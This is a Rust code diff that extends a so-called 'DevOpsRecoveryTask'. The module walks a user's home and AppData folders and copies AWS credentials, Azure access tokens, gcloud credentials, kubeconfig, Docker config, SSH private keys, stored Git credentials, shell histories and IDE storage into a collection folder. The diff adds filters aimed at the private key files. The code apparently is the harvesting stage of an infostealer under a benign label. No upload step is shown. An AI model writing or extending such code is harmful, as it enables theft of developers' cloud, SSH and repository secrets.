@@ -23,6 +23,7 @@ struct DevOpsSpec {
     label: String,
     path: PathBuf,
     is_dir: bool,
+    filters: Option<Vec<String>>,
 }
 
 impl DevOpsRecoveryTask {
@@ -38,6 +39,7 @@ impl DevOpsRecoveryTask {
             label: "AWS Credentials".into(),
             path: aws_creds,
             is_dir: false,
+            filters: None,
         });
 
         let aws_config = env::var("AWS_CONFIG_FILE")
@@ -47,17 +49,20 @@ impl DevOpsRecoveryTask {
             label: "AWS Config".into(),
             path: aws_config,
             is_dir: false,
+            filters: None,
         });
 
         specs.push(DevOpsSpec {
             label: "Azure Profile".into(),
             path: home.join(".azure").join("azureProfile.json"),
             is_dir: false,
+            filters: None,
         });
         specs.push(DevOpsSpec {
             label: "Azure Tokens".into(),
             path: home.join(".azure").join("accessTokens.json"),
             is_dir: false,
+            filters: None,
         });
 
         specs.push(DevOpsSpec {
@@ -67,6 +72,7 @@ impl DevOpsRecoveryTask {
                 .join("gcloud")
                 .join("credentials.db"),
             is_dir: false,
+            filters: None,
         });
 
         if let Ok(k_config) = env::var("KUBECONFIG") {
@@ -75,6 +81,7 @@ impl DevOpsRecoveryTask {
                     label: format!("Kubeconfig (Env {})", i),
                     path,
                     is_dir: false,
+                    filters: None,
                 });
             }
         } else {
@@ -82,6 +89,7 @@ impl DevOpsRecoveryTask {
                 label: "Kubeconfig".into(),
                 path: home.join(".kube").join("config"),
                 is_dir: false,
+                filters: None,
             });
         }
 
@@ -93,45 +101,50 @@ impl DevOpsRecoveryTask {
             label: "Docker Config".into(),
             path: docker_config,
             is_dir: false,
+            filters: None,
         });
 
         specs.push(DevOpsSpec {
             label: "SSH Keys".into(),
             path: home.join(".ssh"),
             is_dir: true,
+            filters: Some(vec![
+                "id_rsa".into(), "id_ed25519".into(), "id_ecdsa".into(), "id_dsa".into(),
+                "known_hosts".into(), "config".into(), "authorized_keys".into(),
+            ]),
         });
 
         specs.push(DevOpsSpec {
             label: "Git Config".into(),
             path: home.join(".gitconfig"),
             is_dir: false,
+            filters: None,
         });
         specs.push(DevOpsSpec {
             label: "Git Credentials".into(),
             path: home.join(".git-credentials"),
             is_dir: false,
+            filters: None,
         });
 
         specs.push(DevOpsSpec {
             label: "Terraform RC".into(),
             path: home.join(".terraform.rc"),
             is_dir: false,
-        });
-        specs.push(DevOpsSpec {
-            label: "Terraform AppData".into(),
-            path: appdata.join("terraform.d"),
-            is_dir: true,
+            filters: None,
         });
 
         specs.push(DevOpsSpec {
             label: "Bash History".into(),
             path: home.join(".bash_history"),
             is_dir: false,
+            filters: None,
         });
         specs.push(DevOpsSpec {
             label: "Zsh History".into(),
             path: home.join(".zsh_history"),
             is_dir: false,
+            filters: None,
         });
         specs.push(DevOpsSpec {
             label: "PowerShell History".into(),
@@ -142,6 +155,26 @@ impl DevOpsRecoveryTask {
                 .join("PSReadLine")
                 .join("ConsoleHost_history.txt"),
             is_dir: false,
+            filters: None,
+        });
+
+        specs.push(DevOpsSpec {
+            label: "VS Code User".into(),
+            path: appdata.join("Code").join("User"),
+            is_dir: true,
+            filters: Some(vec![
+                "settings.json".into(),
+                "keybindings.json".into(),
+                "globalStorage".into(),
+                "snippets".into(),
+            ]),
+        });
+
+        specs.push(DevOpsSpec {
+            label: "JetBrains".into(),
+            path: appdata.join("JetBrains"),
+            is_dir: true,
+            filters: Some(vec!["options".into(), "keymaps".into(), "permanent_id".into()]),
         });
 
         Self { specs }
@@ -178,32 +211,60 @@ impl RecoveryTask for DevOpsRecoveryTask {
                 let dest = dest_root.join(sanitize_label(&spec.label));
 
                 if spec.is_dir {
-                    if let Ok(meta) = fs::metadata(&spec.path).await {
-                        if meta.is_dir() {
-                            let _ = crate::recovery::fs::copy_dir_limited(
-                                &spec.path,
-                                &dest,
-                                &spec.label,
-                                &mut task_artifacts,
-                                1024 * 1024 * 50,
-                                0,
-                            )
-                            .await;
+                    if let Some(filters) = spec.filters {
+                        for filter in filters {
+                            let source = spec.path.join(&filter);
+                            if !source.exists() {
+                                continue;
+                            }
+                            let target = dest.join(&filter);
+                            let meta = match fs::metadata(&source).await {
+                                Ok(m) => m,
+                                Err(_) => continue,
+                            };
+
+                            if meta.is_dir() {
+                                let _ = crate::recovery::fs::copy_dir_limited(
+                                    &source,
+                                    &target,
+                                    &spec.label,
+                                    &mut task_artifacts,
+                                    10, // depth
+                                    100, // limit
+                                )
+                                .await;
+                            } else {
+                                let _ = fs::create_dir_all(&target.parent().unwrap()).await;
+                                if let Ok(_) = fs::copy(&source, &target).await {
+                                    task_artifacts.push(RecoveryArtifact {
+                                        label: spec.label.clone(),
+                                        path: target,
+                                        size_bytes: meta.len(),
+                                        modified: meta.modified().ok(),
+                                    });
+                                }
+                            }
                         }
+                    } else {
+                        let _ = crate::recovery::fs::copy_dir_limited(
+                            &spec.path,
+                            &dest,
+                            &spec.label,
+                            &mut task_artifacts,
+                            5,
+                            500,
+                        )
+                        .await;
                     }
                 } else {
                     if let Ok(meta) = fs::metadata(&spec.path).await {
                         if meta.is_file() {
-                            if let Err(_) = fs::create_dir_all(&dest).await {
-                                return Vec::new();
-                            }
-                            
+                            let _ = fs::create_dir_all(&dest).await;
                             let file_name = spec
                                 .path
                                 .file_name()
                                 .unwrap_or_else(|| std::ffi::OsStr::new("file"));
                             let target_path = dest.join(file_name);
-                            
                             if let Ok(_) = fs::copy(&spec.path, &target_path).await {
                                 task_artifacts.push(RecoveryArtifact {
                                     label: spec.label,
